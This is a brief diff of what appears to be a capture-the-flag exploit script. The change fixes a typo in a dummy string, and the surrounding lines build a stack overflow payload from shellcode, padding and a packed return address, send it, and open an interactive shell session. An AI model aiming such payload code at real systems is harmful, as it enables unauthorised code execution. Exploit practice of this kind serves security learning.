@@ -12,6 +12,6 @@ offset = b'A'*(120-len(shellcode))
 payload = shellcode + offset + p64(address)
 
 
-r.sendline("hello this is unnecesary")
+r.sendline("hello this is unnecessary")
 r.sendline(payload)
 r.interactive()
